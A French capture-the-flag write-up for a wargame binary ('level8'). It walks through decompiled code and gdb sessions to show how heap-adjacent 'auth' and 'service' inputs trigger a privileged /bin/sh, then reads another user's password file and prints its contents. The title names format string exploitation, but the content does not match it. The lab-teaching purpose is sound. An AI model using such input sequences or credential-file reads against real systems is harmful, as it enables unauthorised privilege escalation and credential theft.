
# Format String Exploitation

En décompilant le programme, on observe qu'il y a différents tests pour arriver à une condition finale. Si cette condition est respectée, alors un `shell` avec les droits de `level9` sera lancé.
Observons la condition nécessaire permettant d'exécuter un `shell`.
```C
eax = auth;
eax = *((eax + 0x20));
if (eax != 0) {
	system ("/bin/sh");
	goto label_0;
}
```
Si on traduit le code décompilé pour avoir un code un plus clair, cette est : 
```C
if (auth[32] != '\0') {
	system ("/bin/sh");`
}
```
En effet, `0x20` équivaut à 32 en base10.

Globalement, le code est une boucle infini, qui attend différentes entrées. Si l'entrée est valide, alors on passera à la prochaine condition. Il va donc nous falloir plusieurs étapes pour arriver à la conditon finale vu précédement. 

On remarque dans le premier bloc de code, que l'entrée attendu semble être `auth `.
```C
 puVar6 = (uint8_t *)"auth ";
        do {
            ...
```
Pour valider notre condition finale, la méthode la plus simple serait donc d'écrire `auth ` suivis de plus de 32 caractères afin que `auth[32]` soit différent de `\0`.

Voyons ça sur `gdb`.

```
> gdb level8
[...]
> (gdb) disas main
[...]
   0x080486a8 <+324>:	mov    %eax,(%esp)
   0x080486ab <+327>:	call   0x8048430 <strdup@plt>
   0x080486b0 <+332>:	mov    %eax,0x8049ab0
[...]
> (gdb) b *0x080486ab
[...]
> (gdb) r 
Starting program: /home/user/level8/level8
(nil), (nil)
auth sdfsd
0x804a008, (nil)
service

Breakpoint 2, 0x080486ab in main ()
> (gdb) x/s 0x804a008
0x804a008:	 "sdfsd\n"
```

Ici, nous avons `break` au niveau du `strdup`. Cette fonction est appelée lorsqu'on saisis `service` comme entrée. Nous pouvons à cet endroit afficher la valeur de `auth `.
Lorsque qu'on saisi `auth `, le programme nous r'envoie son adresse. On peut donc afficher son adresse afin d'en connaitre son contenu.
La valeur de `auth ` est ici `sdfsd\n`. Nous pouvons maintenant essayer de mettre plus de caractères afin de valider la condition `auth[32] != '\0'`.

```
> (gdb) b *0x080486ab
[...]
> (gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, (nil)
service 

Breakpoint 2, 0x080486ab in main ()
> (gdb) x/s 0x804a008
0x804a008:	 ""
> (gdb) x/x 0x804a008
0x804a008:	0x00
```

On observe que `auth ` est maintenant égal  à `NULL`. En regardant le code, on remarque `auth ` va être `malloc`, puis le premier octet va être mis à 0. 
Si il y a moins de moins de 31 caractères, notre input va être copié dans `auth `. 


```C
_auth = (undefined4 *)malloc(4);
*_auth = 0;
```

```C
if (str1 < 0x1f) {
	strcpy(_auth, acStack139);
}
```

`0x1f` correspond à 31 en `base 10`.

Nous allons donc devoir trouver une autre solution pour arriver à notre condition finale.

Nous allons maintenant manipuler la stack afin de comprendre un peu mieux le fonctionnement du programme.
Nous allons `break` au niveau du `strcpy` pour voir si notre premiere entrée, à savoir `auth ` rentre dans cette fonction.
Un seconde break au niveau du `strdup` pour voir si notre seconde entrée, à savoir `service` rentre dans cette fonction.
Et un troisième `break` au niveau d'un `mov` qui va ajouter `0x20`à `esp`. En effet, c'est le seule endroit, ou on pourra afficher rentrée toutes nos entrées et pouvoir les afficher. 

```
> gdb ./level8
[...]
(gdb) b *0x0804863d
Breakpoint 1 at 0x804863d
(gdb) b *0x080486ab
Breakpoint 2 at 0x80486ab
(gdb) b *0x080486e7
Breakpoint 3 at 0x80486e7
> r 
[...]
auth 
Breakpoint 1, 0x0804863d in main ()
> (gdb) x/10wx $esp
0xbffff670:	0x0804a008	0xbffff695	0xb7fd1ac0	0xb7fd0ff4
0xbffff680:	0xbffff6ce	0xbffff6cf	0x00000001	0xffffffff
0xbffff690:	0x68747561	0xbf000a20
(gdb) x 0xbffff695
0xbffff695:	0x00bf000a
```

On va décomposer un petit peu. Ici, nous avons saisis `auth ` au niveau du `break` à `strcpy`. On rentre donc bien dans cette fonction. Pour rappele, voici le code correspondant.

```C
  if (stre < 0x1f) {
	strcpy(_auth, acStack139);
}
```

Notre premier argument est à l'adresse `0x0804a008`. `0xbffff695` est l'adresse du second argument de `strcpy`. Si on affiche cet argument, on obtient `0x00bf000a`, mais c'est le `a` qui nous intéresse. Le programme va donc copier `a` dans `auth `.

On peut vérifier cela en continuant notre affichage de la stack.

```
> (gdb) ni
0x08048642 in main ()
> (gdb) x/8wx 0x0804a008
0x804a008:	0x0000000a	0x00000000	0x00000000	0x00020ff1
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
```

On voit bien qu'on retrouve notre `a` en affichant `auth `. Continuons dans notre programme.

```
> (gdb) c
Continuing.
0x804a008, (nil)
service

Breakpoint 2, 0x080486ab in main ()
> (gdb) x/12wx $esp
0xbffff670:	0xbffff697	0x00000080	0xb7fd1ac0	0xb7fd0ff4
0xbffff680:	0xbffff6ce	0xbffff6cf	0x00000001	0xffffffff
0xbffff690:	0x76726573	0x0a656369	0x00000000	0xb7ff3fec
> (gdb) ni
0x080486b0 in main ()
> (gdb) x 0x0804a008
0x804a008:	0x0000000a
> (gdb) x/12wx 0x0804a008
0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
0x804a018:	0x0000000a	0x00000000	0x00000000	0x00020fe1
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
```

On rentre donc bien dans la fonction `strdup`. Voici le bout de code lié à cette fonction.

```C
_service = strdup(auStack137);
```
En affichant la stack, on observe que le contenu de `auth ` est le même que `service`. On voit bien que le contenu de l'adresse de service (`0x804a018`) est bien `0x0000000a`. 
On retrouve donc notre `a`.

Continuons dans notre observation. 

```
> (gdb) c
[...]
login

Breakpoint 3, 0x080486e7 in main ()
> (gdb) x $eax
0x804a008:	0x0000000a
> (gdb) x $eax+0x20
0x804a028:	0x00000000
> (gdb) x/12wx 0x0804a008
0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
0x804a018:	0x0000000a	0x00000000	0x00000000	0x00020fe1
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
```

Ici, on observe que `eax` à bien notre `a`, mais qu'a `eax+0x20`,  `0x804a028` est égal a `NULL`. On a fait `+0x20`, car on a vu précédement, qu'il y avait une comparaison avec `eax+0x20`. Si on regarde la `stack`, on observe qu'a l'adresse `0x804a028`, le contenu est nulle. Il va donc falloir qu'on écrive au minimum `16` caractères après `service` pour que `eax+0x20 != '\0'`. On peut téster ça `gdb`.


```
> (gdb) b *0x080486e7
[...]
> (gdb) r
auth
[...]
serviceAAAAAAAAAAAAAAAA
[...]
login

Breakpoint 1, 0x080486e7 in main ()
(gdb) x $eax
0x804a008:	0x0000000a
(gdb) x $eax+0x20
0x804a028:	0x0000000a
(gdb) x/12wx 0x0804a008
0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000019
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x0000000a	0x00020fd9	0x00000000	0x00000000
```

On voit bien que `x $eax+0x20` est bien différent de `'\0'`. Il nous suffit de continuer le programme. 

```
> (gdb) c
Continuing.
$
```

Nous obtenons bien un shell !

```
> ./level8
[...]
> auth 
0x804a008, (nil)
> service AAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
> login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
``` 
